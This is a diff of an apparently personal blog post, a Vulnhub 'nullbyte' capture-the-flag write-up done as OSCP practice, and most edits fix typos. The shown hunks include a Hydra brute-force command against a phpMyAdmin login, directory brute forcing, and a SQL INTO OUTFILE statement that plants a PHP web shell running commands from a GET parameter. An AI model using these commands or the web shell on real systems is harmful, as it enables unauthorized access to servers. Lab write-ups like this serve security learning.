@@ -1,13 +1,13 @@
 ---
 layout: post
-title: Vulnhub:nullbye
+title: Vulnhub:nullbyte
 ---
 
-Today's box on my OSCP journey is [nullbybe](https://www.vulnhub.com/entry/nullbyte-1,126/).  This box was a lot of fun and one of those boces you can do 2 or more ways.  Here's how I thought through it.
+Today's box on my OSCP journey is [nullbybe](https://www.vulnhub.com/entry/nullbyte-1,126/).  This box was a lot of fun and one of those boxes you can do 2 or more ways.  Here's how I thought through it.
 
 ### Disclaimer
 
-A quick disclaimer here: these aren't going to be "here's how I got root".  The best part about the OSCP journey has been the persepctive I've gained looking at systems and thinking through them, especially coming from a blue team background.  I like to write these to help explain how I thought through the box, where I needed help, and what I learned.
+These isn't "here's how I got root after following someone else's writeup".  The best part about the OSCP journey has been the persepctive I've gained looking at systems and thinking through them, especially coming from a blue team background.  I like to write these to help explain how I thought through the box, where I needed help, and what I learned.
 
 ## Enumeration
 
@@ -145,11 +145,11 @@ rpcinfo 10.10.10.10
 
 Not much luck there.  Unauthenticated login didn't work but we do see which services are exposed.  RPC certainly isn't my expertise but I see nothing to go off of here.
 
-Now, let's check out that web site.  As always, we run a directory brute force and check robots.txt.  Let's kick off dirbuster and browse to the site:
+Now, let's check out that web site.  As always, we run a directory brute force and check robots.txt.  Let's kick off gobuster and browse to the site:
 
-> gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.10 -t 25
+>> gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.10 -t 25
 
-By the way, gobuster can brute force a few things: dns subdomains, directories, etc.  The above command is the prety standard one for brute forcing directories.  "-w" specifies the word list and on Kali, using the dirbuster one always works pretty well.  The only think I like to add is manually checking for directories related to the site or company.  e.g. nike.com/nike.  If we were doing this for real, we would run a tool like cewl and get a wordlist based on the site contents.  "-u" is the URL.  Not that if you want to go down a level, you have to add it to the URL.  For example, say you found nike.com/admin on your first run.  You would then have to run gobuster again like "-u http://nike.com/admin" - gobuster is NOT recursive by default.  that's generally a good thing as the old dirbuster is slow as a dial up modem.  Finally, "-t" is the number of threads.  In the real world, a WAF or even fail2ban would crush our brute force, so you would do this very slow, maybe 2 threads.  Since this is a for learning, we crank it up for the sake of speed.
+By the way, gobuster can brute force a few things: dns subdomains, directories, etc.  The above command is the prety standard one for brute forcing directories.  "-w" specifies the word list and on Kali, using the dirbuster one always works pretty well.  The only thing I like to add is manually checking for directories related to the site or company.  e.g. nike.com/nike.  If we were doing this for real, we would run a tool like cewl and get a wordlist based on the site contents.  "-u" is the URL.  Not that if you want to go down a level, you have to add it to the URL.  For example, say you found nike.com/admin on your first run.  You would then have to run gobuster again like: -u "http://nike.com/admin" - gobuster is NOT recursive by default.  That's generally a good thing as the old dirbuster is slow as a dial up modem when you turn on recursion.  Finally, "-t" is the number of threads.  In the real world, a WAF or even fail2ban would crush our brute force, so you would do this very slow, maybe 2 threads.  Since this is a for learning, we crank it up for the sake of speed.
 
 ![nullbytehome](/images/nb1.png)
 
@@ -192,17 +192,18 @@ Aww man.  At least gobuster (and NMAP) gave us some sites to check out.
 ### Uploads
 
 ![nullbytehome](/images/nb3.png)
+
 Dang it!  I can't see anything but it is promising.  We might be able to upload a webshell and browse here.  We could kick off another gobuster checking this directory but we're not there yet.
 
 ### phpMyAdmin
 
 ![nullbytehome](/images/nb4.png)
 
-Heeeelllllloooooooo nurse!  This is definitely a login page.  But what the heck is phpmyadmin?  We can attack the page, but we need to learn a little more about it so we aren't blindly throwing creds at it.  
+Heeeelllllloooooooo nurse!  This is definitely a login page.  But what the heck is phpMyAdmin?  We can attack the page, but we need to learn a little more about it so we aren't blindly throwing creds at it.  
 
 ## Research
 
-Being completely uneducated on phpmyadmin, I head over to Wikipedia and read up.  It's just a php front end for MySQL.  Ok cool, we might be able to throw some code in a database or upload a php web shell.  I need creds though... [phpMyAdmin Default Creds](https://stackoverflow.com/questions/5818358/phpmyadmin-default-login-password).  Obviously the default doesn't work, but at least I have a username.
+Being completely uneducated on phpMyAdmin, I head over to Wikipedia and read up.  It's just a php front end for MySQL.  Ok cool, we might be able to throw some code in a database or upload a php web shell.  I need creds though... [phpMyAdmin Default Creds](https://stackoverflow.com/questions/5818358/phpmyadmin-default-login-password).  Obviously the default doesn't work, but at least I have a username.
 
 Oh, and don't forget searchsploit.  I don't see anything that jumps out at me.  Plus I don't even know what version it's running yet.
 
@@ -272,7 +273,7 @@ Papers: No Results
 
 This is where this box gets fun.  To use Hydra to brute force a login, you'll need to capture the parameters and identify the HTTP method (POST, etc).  You can easily do this in Chrome developer tools, but I looooooove Burp Suite.  Let's fire up Burp and navigate to the phpMyAdmin login page. 
 
-The newest Burp is pretty aesthetically pleaing.  Make sure intercept is turned on and your browser is set.  Maybe I'll go over that setup in another post.  Go back to your browser, enter some creds and hit "go" then pop over to Burp.  Send that request to Repeater so we can mess with the request:
+The newest Burp is pretty aesthetically pleasing.  Make sure intercept is turned on and your browser is set.  Maybe I'll go over that setup in another post.  Go back to your browser, enter some creds and hit "go" then pop over to Burp.  Send that request to Repeater so we can mess with the request:
 
 ![nullbytehome](/images/nb5.png)
 
@@ -282,9 +283,9 @@ Note the top and bottom of the request pane.  It's an HTTP POST with the pma_use
 
 Hydra is another versatile tool well worth putting in your cheat sheet.  Here's the command I drew up:
 
->hydra -l "root" -P rockyou.txt 10.10.10.10 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1&target=index.php&token=229b41f3a9baa221b3a9939893367538:#1045 Cannot log in to the MySQL server" -t 50 -V
+>>hydra -l "root" -P rockyou.txt 10.10.10.10 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1&target=index.php&token=229b41f3a9baa221b3a9939893367538:#1045 Cannot log in to the MySQL server" -t 50 -V
 
-I specified the username guessing that it would be the default.  Then select a wordlist.  I actually used smaller ones but they were unsuccessful. In general, don't use the big gun unless you have to.  Since we identified a HTTP POST, we tell Hydra to use POST.  The nwe build the Hydra parameters.  It's basically "page:parameters:error".  Note the variables ^USER^ and ^PASS^.
+I specified the username guessing that it would be the default.  Then select a wordlist.  I actually used smaller ones but they were unsuccessful. In general, don't use the big gun unless you have to.  Since we identified a HTTP POST, we tell Hydra to use POST.  Then we build the Hydra parameters.  It's basically "page:parameters:error".  Note the variables ^USER^ and ^PASS^.
 
 I let this run and grabbed a cup of tea.  I come back to success!  That was quick.  Wait... Hydra stopped but it isn't displaying a password... Note that I ran the command with "-V" or verbose, so it would output the attempts as they happened.  I noticed it stopeped at a specific line in the rockyou.txt file, so I open rockyou.txt.  It stopped after it tried a 3 character password.  Why?!?!!?!?!? (notice the amount of question marks and exclamation points)  
 
@@ -292,11 +293,11 @@ Let's try the password in the browser.   Oh... I get a different error.  I play 
 
 Then a tiny lightbulb goes off in my head... it would be faster and I wouldn't get the error if I just stripped values less than 5 characters or so in my password list.  I copy rockyou to a local directory.  I know sed can do this, but I'm not a Linux wizard... so I google.
 
->sed '/^.\{,4\}$/d' rockyou.txt -i
+>>sed '/^.\{,4\}$/d' rockyou.txt -i
 
 To verify, I open rockyou.txt in Vim and look for lines of 4 characters:
 
->/^.\{,4}$/
+>>/^.\{,4}$/
 
 Looks like we are in business.  I run Hydra again with the new passowrd list.  And wait.  And wait.  I go though all my notes so far.  Did I miss anything?  Should we spin up a Hydra to brute force SSH at the same time?  Could this box be all about brute force?
 
@@ -320,7 +321,7 @@ Are those usernames and a hashed password?  w00t!  I copy the hash off and throw
 
 Dang it.  What kind of hash is it?  One resource I always reference for hashes is [Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes) and the command line hashid.
 
->hashid YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE
+>>hashid YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE
 Analyzing 'YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE'
 [+] Cisco-IOS(SHA-256) 
 [+] Cisco Type 4 
@@ -415,7 +416,7 @@ drwxrwxrwx 2 root root  4096 Aug  2  2015 uploads
 
 Spankowitz, you dummy.  You blindly copied a shell from Github and didn't look at where it was trying to place it!  The error was telling you that the directory didn't exist, not that you didn't have permission.  Let's modify our little SQL command:
 
->SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
+>>SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
 INTO OUTFILE ‘/var/www/html/uploads/cmd.php’
 
 ![nullbytehome](/images/nb10.png)
@@ -482,9 +483,9 @@ lrwxrwxrwx 1 root root        9 Mar 17  2015 /usr/bin/python -> python2.7
 /usr/bin/gcc
 ```
 
-Note that the architecture is i686.  More on that in a bit.  Every user's home directory is readable, Python permissions are pretty lax.  We've got GCC installed.  Interesting that a compiler is installed.  Now I am no priv esc expert.  I'm building a cheat sheet for OSCP.  But I got nothing after looking at the above.  No interesting cron job, no weird files in the user's home directories, no odd binary running.  I'm out of ideas, so let's run another script: ![Linux Exploit Suggester](https://github.com/jondonas/linux-exploit-suggester-2)
+Note that the architecture is i686.  More on that in a bit.  Every user's home directory is readable, Python permissions are pretty lax.  We've got GCC installed.  Interesting that a compiler is installed.  Now I am no priv esc expert.  I'm building a cheat sheet for OSCP.  But I got nothing after looking at the above.  No interesting cron job, no weird files in the user's home directories, no odd binary running.  Oh and fail2ban was running, so SSH bruteforcing would not have worked!
 
-I copy the file over to the victim, add execute permission and let it go:
+I'm out of ideas, so let's run another script: ![Linux Exploit Suggester](https://github.com/jondonas/linux-exploit-suggester-2)  I copy the file over to the victim, add execute permission and let it go:
 
 ```
 ./les2.pl
